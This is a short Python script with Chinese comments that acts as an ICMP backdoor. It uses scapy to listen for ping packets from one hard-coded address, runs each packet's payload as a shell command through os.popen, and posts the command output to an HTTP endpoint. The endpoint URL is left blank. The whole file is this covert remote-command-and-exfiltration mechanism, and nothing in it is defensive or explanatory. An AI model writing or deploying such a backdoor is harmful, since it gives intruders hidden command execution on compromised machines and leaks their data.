#encoding:utf-8
from scapy.all import *
from os import popen
from random import randint
from time import sleep
from requests import post
def pk(pkt):
    if pkt[IP].src == '192.168.214.129':  #本机的IP地址
        data = pkt[Raw].load.decode('utf-8')#将二进制数据变成字符串
        re_data = popen(data,'r')
        t=re_data.read().encode('utf-8')
        lurl = "http://"#本机开放的php服务
        post(url=lurl,data={'data':t.decode('utf-8')})
        re_data.close()
def sniffs():
    sniff(filter='icmp and host 192.168.214.129',prn = pk)#监听指定IP的icmp数据包
sniffs()


